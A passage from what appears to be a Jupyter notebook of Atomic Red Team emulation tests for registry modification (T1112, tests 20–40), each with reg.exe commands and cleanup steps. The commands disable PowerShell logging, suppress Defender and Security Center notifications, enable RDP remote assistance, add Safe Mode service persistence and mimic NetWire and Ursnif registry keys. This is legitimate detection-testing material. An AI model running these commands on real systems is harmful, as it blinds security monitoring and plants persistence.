    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "89c3b884",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 20"
  },
  {
   "cell_type": "markdown",
   "id": "fe2b4d38",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ceb0dfd6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 20 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "cf0e22e1",
   "metadata": {},
   "source": [
    "### Atomic Test #21 - Activate Windows NoFileMenu Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove File menu from Windows Explorer Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "436478e8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 21"
  },
  {
   "cell_type": "markdown",
   "id": "ca3dc8df",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "15f4e738",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 21 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "3552ac17",
   "metadata": {},
   "source": [
    "### Atomic Test #22 - Activate Windows NoClose Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable and remove the Shut Down command Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bcd66fc9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 22"
  },
  {
   "cell_type": "markdown",
   "id": "164d0dc8",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4cea53f8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 22 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c6e3ffa5",
   "metadata": {},
   "source": [
    "### Atomic Test #23 - Activate Windows NoSetTaskbar Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable changes to Taskbar and Start Menu Settings Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2bf6d655",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 23"
  },
  {
   "cell_type": "markdown",
   "id": "7c3f510d",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "44b0a119",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 23 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ce68d6b2",
   "metadata": {},
   "source": [
    "### Atomic Test #24 - Activate Windows NoTrayContextMenu Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable context menu for taskbar Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4f94602f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 24"
  },
  {
   "cell_type": "markdown",
   "id": "a6516322",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "343587b1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 24 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "52f8d103",
   "metadata": {},
   "source": [
    "### Atomic Test #25 - Activate Windows NoPropertiesMyDocuments Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to hide Properties from \"My Documents icon\" Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0194ba0b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 25"
  },
  {
   "cell_type": "markdown",
   "id": "e262cb42",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5ba03b87",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 25 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ea244753",
   "metadata": {},
   "source": [
    "### Atomic Test #26 - Hide Windows Clock Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to Hide Clock Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d7a3dd75",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 26"
  },
  {
   "cell_type": "markdown",
   "id": "165c8b9d",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c1aeebda",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 26 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c8c8fe1c",
   "metadata": {},
   "source": [
    "### Atomic Test #27 - Windows HideSCAHealth Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to remove security and maintenance icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e752b6c1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 27"
  },
  {
   "cell_type": "markdown",
   "id": "0948fa7c",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "59346fc5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 27 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1a07bf42",
   "metadata": {},
   "source": [
    "### Atomic Test #28 - Windows HideSCANetwork Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b2c5918f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 28"
  },
  {
   "cell_type": "markdown",
   "id": "4d6d57de",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3c19806b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 28 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e8a33e11",
   "metadata": {},
   "source": [
    "### Atomic Test #29 - Windows HideSCAPower Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the battery icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "69fc1d5f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 29"
  },
  {
   "cell_type": "markdown",
   "id": "5128be1d",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "13e80d7d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 29 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "18276b96",
   "metadata": {},
   "source": [
    "### Atomic Test #30 - Windows HideSCAVolume Group Policy Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the volume icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect..\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "93415cdc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 30"
  },
  {
   "cell_type": "markdown",
   "id": "35ad87bc",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "98ff0200",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 30 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "79d2750a",
   "metadata": {},
   "source": [
    "### Atomic Test #31 - Windows Modify Show Compress Color And Info Tip Registry",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to show compress color and show tips feature. \nSee how hermeticwiper uses this technique - https://www.splunk.com/en_us/blog/security/detecting-hermeticwiper.html\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7d77f913",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 31"
  },
  {
   "cell_type": "markdown",
   "id": "001237d3",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /f >nul 2>&1\nreg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e73a8117",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 31 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "2808117b",
   "metadata": {},
   "source": [
    "### Atomic Test #32 - Windows Powershell Logging Disabled",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable Powershell Module Logging, Script Block Logging, Transcription and Script Execution\nsee https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.PowerShell::EnableModuleLogging\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f\nREM do a little cleanup immediately to avoid execution issues with later tests\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /f >nul 2>&1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3fc4f225",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 32"
  },
  {
   "cell_type": "markdown",
   "id": "850729c7",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /f >nul 2>&1\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /f >nul 2>&1\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5832491e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 32 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a9329f7a",
   "metadata": {},
   "source": [
    "### Atomic Test #33 - Windows Add Registry Value to Load Service in Safe Mode without Network",
    "Modify the registry to allow a driver, service, to persist in Safe Mode.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Minimal with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode without networking. The same applies for the Network subkey.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d60382c8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 33"
  },
  {
   "cell_type": "markdown",
   "id": "c3e223d6",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4105d86b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 33 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "616c6f9b",
   "metadata": {},
   "source": [
    "### Atomic Test #34 - Windows Add Registry Value to Load Service in Safe Mode with Network",
    "Modify the registry to allow a driver, service, to persist in Safe Mode with networking.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Netowrk with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode with networking.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a3163685",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 34"
  },
  {
   "cell_type": "markdown",
   "id": "df4df1f5",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4c73d35b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 34 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "6691234d",
   "metadata": {},
   "source": [
    "### Atomic Test #35 - Disable Windows Toast Notifications",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a7d13aa1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 35"
  },
  {
   "cell_type": "markdown",
   "id": "34e3ed79",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5ea94bf5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 35 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "eb6f37f4",
   "metadata": {},
   "source": [
    "### Atomic Test #36 - Disable Windows Security Center Notifications",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows security center notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4b36890d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 36"
  },
  {
   "cell_type": "markdown",
   "id": "df19a994",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1afeb613",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 36 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "adfb075c",
   "metadata": {},
   "source": [
    "### Atomic Test #37 - Suppress Win Defender Notifications",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to suppress the windows defender notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cd78f612",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 37"
  },
  {
   "cell_type": "markdown",
   "id": "07fcc59b",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3cb41b4e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 37 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "cab94cab",
   "metadata": {},
   "source": [
    "### Atomic Test #38 - Allow RDP Remote Assistance Feature",
    "Modify the registry of the currently logged in user using reg.exe via cmd console to allow rdp remote assistance feature. This feature allow specific\nuser to rdp connect on the targeted machine.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6496c51d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 38"
  },
  {
   "cell_type": "markdown",
   "id": "61cbb231",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e15b6cee",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 38 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a2b8fd94",
   "metadata": {},
   "source": [
    "### Atomic Test #39 - NetWire RAT Registry Key Creation",
    "NetWire continues to create its home key (HKCU\\SOFTWARE\\NetWire) as well as adding it into the auto-run group in the victim\u2019s registry.\nSee how NetWire malware - https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /t REG_SZ  /d \"C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe\" /f\nreg add HKCU\\SOFTWARE\\NetWire /v HostId /t REG_SZ /d HostId-kai6Ci /f\nreg add HKCU\\SOFTWARE\\NetWire /v \"Install Date\" /t REG_SZ /d \"2021-08-30 07:17:27\" /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ccc25092",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 39"
  },
  {
   "cell_type": "markdown",
   "id": "43b35556",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /f >nul 2>&1\nreg delete HKCU\\SOFTWARE\\NetWire /va /f >nul 2>&1\nreg delete HKCU\\SOFTWARE\\NetWire /f >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2474fa57",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 39 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "00b98c1e",
   "metadata": {},
   "source": [
    "### Atomic Test #40 - Ursnif Malware Registry Key Creation",
    "Ursnif downloads additional modules from the C&C server and saves these in the registry folder HKEY_CURRENT_USER\\Software\\AppDataLow\\Software\\Microsoft\\\nMore information - https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add HKCU\\Software\\AppDataLow\\Software\\Microsoft\\3A861D62-51E0-15700F2219A4 /v comsxRes /t REG_BINARY  /d 72656463616e617279 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7294ff4f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1112 -TestNumbers 40"
  },
  {
   "cell_type": "markdown",
   "id": "697d3965",
   "metadata": {},
